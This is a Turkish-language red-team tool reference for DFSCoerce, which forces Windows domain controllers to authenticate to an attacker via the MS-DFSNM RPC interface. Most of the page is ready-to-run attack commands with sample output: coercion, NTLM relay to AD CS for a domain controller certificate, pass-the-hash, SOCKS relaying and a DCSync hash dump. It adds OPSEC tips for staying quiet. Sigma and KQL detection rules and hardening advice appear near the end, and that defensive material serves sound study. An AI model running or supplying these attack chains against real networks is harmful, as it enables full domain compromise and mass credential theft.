# DFSCoerce

> **Kategori:** [4. ZEHİRLEME, ORTADAKİ ADAM VE ZORLAMALI KİMLİK DOĞRULAMA (POISONING & COERCION)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** MS-DFSNM (Distributed File System Namespace Management) protokolündeki `NetrDfsRemoveStdRoot` ve `NetrDfsAddStdRoot` fonksiyonlarını kullanarak Windows sunucularını ve Domain Controller'ları saldırgana kimlik doğrulamaya zorlayan Python aracı.

---

## 1. Genel Bakış ve Amaç

**DFSCoerce** (Filip Dragovic / @Wh04m1001 tarafından keşfedilen ve geliştirilen), Microsoft'un **MS-DFSNM (Distributed File System Namespace Management Protocol)** mimarisindeki mantıksal bir eksikliği sömüren etkili bir kimlik doğrulama zorlama (Authentication Coercion) aracıdır.

Active Directory ortamlarında Dağıtık Dosya Sistemi (DFS), etki alanı genelindeki paylaşımların (özellikle `SYSVOL` ve `NETLOGON`) istemcilere tek bir mantıksal ad alanı altında sunulmasını sağlar. Bu nedenle, neredeyse tüm Domain Controller sistemlerinde DFS servisi varsayılan olarak kuruludur ve aktif olarak çalışır.

DFS ad alanlarını yönetmek için kullanılan MS-DFSNM RPC arayüzü (`\pipe\netdfs`), `NetrDfsRemoveStdRoot` ve `NetrDfsAddStdRoot` isimli fonksiyonları barındırır. Bu fonksiyonlar çağrılırken `ServerName` parametresine uzak bir UNC yolu veya saldırgan IP'si verildiğinde (`\\attacker_ip\share`), hedef sunucu bu kökün varlığını ve durumunu doğrulamak amacıyla **kendi makine hesabı (SYSTEM)** context'inde saldırganın SMB (TCP 445) veya WebDAV servisine anında kimlik doğrulama bağlantısı başlatır.

DFSCoerce'in en kritik avantajı, sistem yöneticilerinin PetitPotam (EFS) veya SpoolSample (PrinterBug) açıklarını yamalamış veya ilgili servisleri kapatmış olduğu ortamlarda ortaya çıkar: **DFS servisi Active Directory replikasyonu için hayati önem taşıdığından kolayca kapatılamaz!**

```
       [ Saldırgan: DFSCoerce ]
                   |
     1. MS-DFSNM RPC Çağrısı (Port 445 SMB IPC$ / \pipe\netdfs)
        NetrDfsRemoveStdRoot(ServerName: "\\192.168.1.50\share")
                   |
                   v
       [ Hedef Domain Controller (DC01) ]
                   |
     2. DC01$ Makine Hesabı (SYSTEM Context)
        Saldırgan Adresine SMB Bağlantısı Açar:
                   |
                   v
     =============================================== Yerel Ağ (TCP 445)
                   |
                   v
         [ Dinleyici: ntlmrelayx ] (192.168.1.50)
                   |
     3. NTLMv2 Makine Kimliğini AD CS / LDAP'a Relay Eder
                   |
                   v
         [ AD CS Sertifika Otoritesi ] ===> Domain Admin Sertifikası Alındı!
```

### Neden Önemli?
- **Servis Kapatma Direnci:** Spooler servisi Domain Controller'larda rahatlıkla kapatılabilirken, DFS ad alanları etki alanının temel işlevlerinden biri olduğu için genellikle açıktır.
- **Standart Kullanıcı Yeterliliği:** Herhangi bir standart etki alanı kullanıcısının kimlik bilgisiyle RPC çağrısı yapılabilir.
- **AD CS ESC8 Entegrasyonu:** Tetiklenen NTLM kimlik doğrulama akışı, imzalama zorunluluğu olmayan AD CS Web Enrollment uç noktalarına doğrudan relay edilebilir.

### Alternatif Araçlarla Karşılaştırma

| Özellik / Kriter | DFSCoerce | PetitPotam | ShadowCoerce |
|---|---|---|---|
| **Hedef Protokol** | MS-DFSNM (DFS Namespace) | MS-EFSR (Encrypting File System) | MS-FSRVP (Volume Shadow Copy) |
| **RPC Named Pipe** | `\pipe\netdfs` | `\pipe\efsrpc`, `\pipe\lsarpc` | `\pipe\fssagentrpc` |
| **Kritik Fonksiyon** | `NetrDfsRemoveStdRoot` | `EfsRpcOpenFileRaw` | `IsPathSupported` |
| **DC'de Varsayılan Açık mı?** | Evet (Çoğu DC'de aktiftir) | Evet (EFS açıktır) | Yalnızca File Server rolü varsa |
| **Anonim Çalışma** | Hayır (Kimlik şarttır) | Eski sistemlerde evet | Hayır (Kimlik şarttır) |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

DFSCoerce Impacket kütüphanesini kullanarak Python 3 üzerinden çalıştırılır.

```bash
python3 dfscoerce.py -u <Kullanıcı> -p <Parola> -d <Etki_Alanı> <Dinleyici_IP> <Hedef_IP> [Seçenekler]
```

### Kritik Parametreler Tablosu

| Parametre | Açıklama | Örnek Değer |
|---|---|---|
| `<Dinleyici_IP>` | Hedef sunucunun SMB bağlantısı açacağı saldırgan IP adresi (Zorunlu). | `192.168.1.50` |
| `<Hedef_IP>` | Zorlanacak Windows sunucusu veya Domain Controller IP/FQDN (Zorunlu). | `192.168.1.10` |
| `-u, --username` | RPC kimlik doğrulaması için etki alanı kullanıcısı. | `-u ahmet` |
| `-p, --password` | Kullanıcının parolası. | `-p Parola123!` |
| `-d, --domain` | Hedef Active Directory etki alanı adı. | `-d lab.local` |
| `-hashes` | Parola yerine LM:NTLM hash ile kimlik doğrulama. | `-hashes :e19ccf...` |
| `-target-ip` | Hedef host adının çözümleneceği IP adresi. | `-target-ip 192.168.1.10` |
| `-k, --kerberos` | SMB/RPC oturumu için Kerberos biletlerini kullanır. | `-k` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Standart Kimlik Doğrulamalı DFSCoerce Tetiklemesi

Düşük yetkili bir etki alanı kullanıcısıyla hedef Domain Controller'ı dinleyiciye zorlama.

```bash
python3 dfscoerce.py -u can.oz -p Pass123! -d lab.local 192.168.1.50 192.168.1.10
```

```text
[*] Authenticating to 192.168.1.10 as lab.local\can.oz...
[+] Connected to SMB IPC$ share!
[*] Binding to MS-DFSNM RPC interface (\pipe\netdfs)...
[+] Bound successfully!
[*] Triggering NetrDfsRemoveStdRoot with UNC '\\192.168.1.50\share'...
[+] NetrDfsRemoveStdRoot dispatched! Check your listener!
```
*Analiz:* DFSCoerce `\pipe\netdfs` borusuna bağlandı ve `NetrDfsRemoveStdRoot` çağrısını iletti. Hedef sunucu anında `192.168.1.50` adresine SMB isteği gönderdi.

---

### Senaryo 2: DFSCoerce ve ntlmrelayx ile AD CS ESC8 Sömürüsü (Domain Admin)

PetitPotam'ın engellendiği bir ortamda DFSCoerce kullanarak Domain Controller'ın kimliğini AD CS'e aktarma.

```bash
# Terminal 1: ntlmrelayx dinleyicisini başlat
sudo impacket-ntlmrelayx -t http://ca.lab.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Terminal 2: DFSCoerce ile DC'yi dinleyiciye zorla
python3 dfscoerce.py -u can.oz -p Pass123! -d lab.local 192.168.1.50 192.168.1.10
```

```text
[ntlmrelayx Konsolu]
[*] HTTP Client connected from 192.168.1.10 (DC01$)
[*] Relaying authentication for LAB\DC01$ to http://ca.lab.local/certsrv/certfnsh.asp
[+] Successfully requested certificate for LAB\DC01$!
[*] Certificate exported to /tmp/DC01.pfx
```
*Analiz:* DFSCoerce ile tetiklenen DC makine hesabı Sertifika Otoritesine relay edildi. Elde edilen sertifika ile Kerberos TGT üretilerek etki alanında tam yetki sağlandı.

---

### Senaryo 3: Pass-the-Hash ile NTLM Hash Kullanarak Tetikleme

Açık metin parola olmadan bellekten çekilen NTLM hash ile çalıştırma.

```bash
python3 dfscoerce.py -u operator -hashes :e19ccf750c72545f1b5f1b2b80429f08 -d lab.local 192.168.1.50 192.168.1.10
```
*Analiz:* NTLM hash ile SMB oturumu açılarak RPC çağrısı sorunsuz iletildi.

---

### Senaryo 4: rpcdump.py ile Hedefte netdfs Borusunun Açık Olduğunu Doğrulama

DFSCoerce çalıştırmadan önce hedefte MS-DFSNM protokolünün aktif olup olmadığını tespit etme.

```bash
rpcdump.py lab.local/can.oz:Pass123!@192.168.1.10 | grep -i "netdfs"
```

```text
Protocol: [MS-DFSNM]: Distributed File System Namespace Management
UUID: 4fc742e0-4a10-11cf-8273-00aa0051e52a v3.0
Endpoint: ncacn_np:[\\pipe\\netdfs]
```
*Analiz:* `\pipe\netdfs` borusunun hazır olduğu ve sistemin DFSCoerce saldırısına uygun olduğu teyit edildi.

---

### Senaryo 5: WebDAV Formatında UNC Yolu ile Tetikleme

Port 445 güvenlik duvarında kapalı olduğunda WebClient üzerinden HTTP portuna zorlama.

```bash
python3 dfscoerce.py -u can.oz -p Pass123! -d lab.local 192.168.1.50@8080/share 192.168.1.10
```
*Analiz:* Hedef sunucunun WebClient servisi varsa `192.168.1.50:8080` adresine WebDAV üzerinden kimlik doğrulaması yönlendirildi.

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Belirtisi / Log | Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `STATUS_OBJECT_NAME_NOT_FOUND (0xc0000034)` | Hedef sistemde `\pipe\netdfs` named pipe'ı bulunamadı veya DFS hizmeti durdurulmuştur. | Hedef sunucunun DFS rolüne sahip olup olmadığını kontrol edin. Standart üye sunucularda DFS kurulu olmayabilir; Domain Controller'ları hedefleyin veya `PetitPotam`'a geçin. |
| `RPC_S_ACCESS_DENIED (0x5)` | Kullanıcının RPC arayüzüne bağlanma izni yoktur veya Microsoft RPC kısıtlama filtreleri devrededir. | Etki alanında geçerli başka bir kullanıcı hesabı deneyin veya kimlik bilgilerini doğrulayın. |
| `WERR_NCRR_SERVER_UNAVAILABLE (0x6ba)` | 1. Hedef IP yanlış.<br>2. Port 445 SMB trafiği güvenlik duvarı tarafından engellenmektedir. | Hedef IP'ye SMB erişimini `nc -zvw 2 <hedef> 445` ile test edin. |
| `Target connected to listener but Relay failed: Server requires signing` | Hedef sunucuda SMB Signing veya LDAP Signing zorunludur. | Hedef olarak SMB/LDAP yerine imzalama zorunluluğu bulunmayan HTTP (AD CS Web Enrollment) seçin. |
| `Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN` | Kerberos kimlik doğrulaması sırasında SPN çözümlenemedi. | Hedefi IP yerine FQDN adı (`dc01.lab.local`) ile belirtin. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

### 5.1 Bırakılan İzler (Event ID & Telemetri)

- **Domain Controller Event ID 5145 (A network share object was accessed):**
  - Share Name: `\\*\IPC$`
  - Relative Target Name: `netdfs`
  - Access Mask: `0x12019F`.
- **Domain Controller Event ID 4624 (Logon):**
  - Logon Type: `3` (Network Logon).
  - Çağrıyı yapan kullanıcının kimlik bilgileri.
- **Sysmon Event ID 3 (Network Connection):**
  - Domain Controller'ın `SYSTEM` context'inde saldırganın IP adresine 445 veya 80 portundan giden bağlantı açması.

### 5.2 Ağ ve EDR İmzaları
- **MS-DFSNM UUID İmzası:** Ağ trafiğinde `4fc742e0-4a10-11cf-8273-00aa0051e52a` UUID'sine yapılan Bind çağrıları.
- **Anormal NetrDfsRemoveStdRoot Opnum:** RPC Opnum `12` (`NetrDfsRemoveStdRoot`) veya Opnum `13` çağrısının şüpheli bir UNC yolu argümanıyla iletilmesi.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Kullanım Amacı |
|---|---|---|
| **T1187** | Forced Authentication | DFS RPC arayüzü üzerinden NTLM kimlik doğrulama zorlama. |
| **T1557.001** | Adversary-in-the-Middle: LLMNR/NBT-NS and SMB Relay | Tetiklenen makine kimliğini AD CS'e aktarma. |
| **T1021.002** | Remote Services: SMB/Windows Admin Shares | IPC$ ve netdfs named pipe erişimi. |

### 5.4 OPSEC Önerileri

| Risk | Önlem / Güvenli Operasyon Adımı |
|---|---|
| **netdfs Borusu Yoksa Hata:** Hedefte DFS yoksa başarısız deneme loglanır. | Öncesinde `rpcdump` ile sessizce pipe kontrolü yapın. |
| **Tetikleme Sonrası Hız:** Dinleyici hazır olmadan tetikleme yapmak şüphe uyandırır. | ntlmrelayx'i tamamen başlattıktan sonra DFSCoerce komutunu çalıştırın. |
| **Kerberos Kullanımı:** NTLM oturum açma logları daha gürültülüdür. | Mümkünse `-k` (Kerberos) bayrağını kullanın. |

### 5.5 Savunma Karşılığı ve Blue Team Tespiti

#### Tespit Kuralı (Sigma — netdfs Named Pipe Üzerinden Koersiyon Tespiti)
```yaml
title: Potential DFSCoerce Authentication Coercion
status: experimental
description: Domain Controller IPC$ paylaşımı altında netdfs named pipe erişimi ve ardından dış SMB bağlantısı.
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 5145
        ShareName: '\\*\IPC$'
        RelativeTargetName: 'netdfs'
    condition: selection
level: high
```

#### Tespit Kuralı (KQL — Microsoft Sentinel)
```kql
SecurityEvent
| where EventID == 5145
| where ShareName endswith "IPC$"
| where RelativeTargetName =~ "netdfs"
| project TimeGenerated, Computer, Account, IpAddress, RelativeTargetName
| order by TimeGenerated desc
```

#### Sertleştirme ve Önleme Adımları
1. **RPC Filtreleri Tanımlama (RPC Filters):** Windows Filtering Platform (WFP) kullanılarak MS-DFSNM RPC arayüzüne standart kullanıcıların uzaktan erişimi engellenmelidir.
2. **AD CS Web Enrollment Güvenliği:** Sertifika servislerinde EPA (Extended Protection for Authentication) aktif edilmeli veya HTTP uç noktaları devre dışı bırakılmalıdır.
3. **SMB İmzalama Zorunluluğu:** Etki alanında tüm sistemlerde SMB Signing zorunlu kılınmalıdır (`RequireSecuritySignature = True`).

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

```bash
# 1. Standart kimlikli DFSCoerce çalıştırma
python3 dfscoerce.py -u ahmet -p Parola123 -d sirket.local 192.168.1.50 192.168.1.10
```
- **Ne Yapar?:** DC01'i `192.168.1.50` dinleyicisine SMB üzerinden bağlanmaya zorlar.
- **Ne Zaman Kullanılır?:** PetitPotam veya PrinterBug kapalı olduğunda DC'yi tetiklemek için.
- **Parametreler:** `-u/-p/-d`: Kimlik; `192.168.1.50`: Dinleyici; `192.168.1.10`: Hedef DC.

```bash
# 2. Pass-the-Hash ile NTLM hash kullanarak tetikleme
python3 dfscoerce.py -u operator -hashes :e19ccf750c72545f1b5f1b2b80429f08 -d sirket.local 192.168.1.50 192.168.1.10
```
- **Ne Yapar?:** Parola bilmeden NTLM hash ile `netdfs` borusuna bağlanır ve tetikler.
- **Ne Zaman Kullanılır?:** Bellekten yalnızca hash elde edildiğinde.
- **Parametreler:** `-hashes`: NTLM hash formatı.

```bash
# 3. ntlmrelayx ile AD CS ESC8 sertifika relay dinleyicisi
sudo impacket-ntlmrelayx -t http://ca.sirket.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```
- **Ne Yapar?:** DFSCoerce'in tetiklediği makine hesabını yakalayıp CA'ya relay eder.
- **Ne Zaman Kullanılır?:** DFSCoerce komutunu çalıştırmadan hemen önce dinleme modunda bekletilir.
- **Parametreler:** `--adcs`: AD CS modu; `--template`: DC şablonu.

```bash
# 4. Kerberos biletleri ile kimlik doğrulama (-k)
export KRB5CCNAME=/tmp/ticket.ccache
python3 dfscoerce.py -k -no-pass -d sirket.local 192.168.1.50 192.168.1.10
```
- **Ne Yapar?:** Ccache Kerberos biletini kullanarak DFSCoerce çağrısını yürütür.
- **Ne Zaman Kullanılır?:** NTLM kısıtlamaları olan saf Kerberos ortamlarında.
- **Parametreler:** `-k`: Kerberos kullan; `-no-pass`: Parola sorma.

```bash
# 5. Hedefte netdfs pipe kontrolü (rpcdump)
rpcdump.py sirket.local/ahmet:Parola123@192.168.1.10 | grep -i "netdfs"
```
- **Ne Yapar?:** DC üzerinde DFSNM servisinin dinlenip dinlenmediğini doğrular.
- **Ne Zaman Kullanılır?:** DFSCoerce çalıştırmadan önce zafiyet uygunluğunu teyit etmek için.
- **Parametreler:** `rpcdump.py`: RPC arayüz sorgulayıcı.

```bash
# 6. Coercer aracı içinden yalnızca DFSNM modunu tetikleme
coercer coerce -t 192.168.1.10 -l 192.168.1.50 -u ahmet -p Parola123 -d sirket.local --filter-protocol-name MS-DFSNM
```
- **Ne Yapar?:** Coercer otomasyon motoru içinden doğrudan DFSCoerce fonksiyonunu çağırır.
- **Ne Zaman Kullanılır?:** Coercer aracı tercih edildiğinde tek bir komutla tetiklemek için.
- **Parametreler:** `--filter-protocol-name MS-DFSNM`: Protokol filtresi.

```bash
# 7. SOCKS proxy modu ile SMB relay zinciri kurma
sudo impacket-ntlmrelayx -tf smb_targets.txt -smb2support -socks
```
- **Ne Yapar?:** DFSCoerce ile zorlanan sunucuların kimliklerini SOCKS tünelinde saklar.
- **Ne Zaman Kullanılır?:** Relay edilen makineler üzerinden komut çalıştırmak için.
- **Parametreler:** `-socks`: SOCKS proxy başlat.

```bash
# 8. Elde edilen DC TGT'si ile DCSync çalıştırma
secretsdump.py -k -no-pass sirket.local/DC01\$@192.168.1.10 -just-dc-ntlm
```
- **Ne Yapar?:** DFSCoerce + PKINIT zincirinden sonra etki alanının tüm parola hash'lerini dökerek operasyonu tamamlar.
- **Ne Zaman Kullanılır?:** Etki alanı tam kontrolü elde edildiğinde.
- **Parametreler:** `-just-dc-ntlm`: Parola dökümü.

```bash
# 9. Hedef IP'yi doğrudan belirterek DNS çözümlemesini atlama (-target-ip)
python3 dfscoerce.py -u ahmet -p Parola123 -d sirket.local -target-ip 192.168.1.10 192.168.1.50 dc01.sirket.local
```
- **Ne Yapar?:** DNS aramasını baypas ederek doğrudan IP üzerinden SMB oturumu açar.
- **Ne Zaman Kullanılır?:** DNS çözümleme sorunları veya VPN gecikmeleri olduğunda.
- **Parametreler:** `-target-ip`: Hedef IP sabitleme.

```powershell
# 10. Hedef DC'de DFS servis durumunu PowerShell ile sorgulama
Get-Service -ComputerName DC01 -Name Dfs
```
- **Ne Yapar?:** Uzak makinede DFS Namespace servisinin durumunu kontrol eder.
- **Ne Zaman Kullanılır?:** Windows pivot hostundan ön denetim yaparken.
- **Parametreler:** `-ComputerName`: Hedef; `-Name Dfs`: Servis adı.

---

## Kaynaklar

- **Resmi GitHub Deposu (DFSCoerce):** [https://github.com/Wh04m1001/DFSCoerce](https://github.com/Wh04m1001/DFSCoerce)
- **Filip Dragovic Blog — DFSCoerce Technical Analysis:** [https://wh04m1001.github.io/](https://wh04m1001.github.io/)
- **Microsoft Open Specifications — MS-DFSNM Protocol:** [https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/)

---

> **Önceki:** [← SpoolSample](./SpoolSample.md) · **Sonraki:** [ShadowCoerce →](./ShadowCoerce.md)
